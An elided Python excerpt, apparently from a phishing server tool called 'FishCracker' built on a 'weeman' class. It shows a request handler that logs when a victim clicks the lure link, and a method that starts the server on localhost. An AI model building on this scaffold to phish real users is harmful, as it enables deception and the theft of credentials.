...
class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ## Set server version
    server_version = "FishCracker %s (%s)" %(__version__, __codename__)
    """
    ...
    def log_message(self, format, *args):
        ...
        arg = format%args
        if arg.split()[1] == "/":
            printt(3, "%s - has Click and visit the Link!." %self.address_string())
        else:
...
class weeman(object):
    ...
    def serve(self):
        ...
        print("[i] Starting FishCracker %s server on http://localhost:%d" %(__version__, self.port))
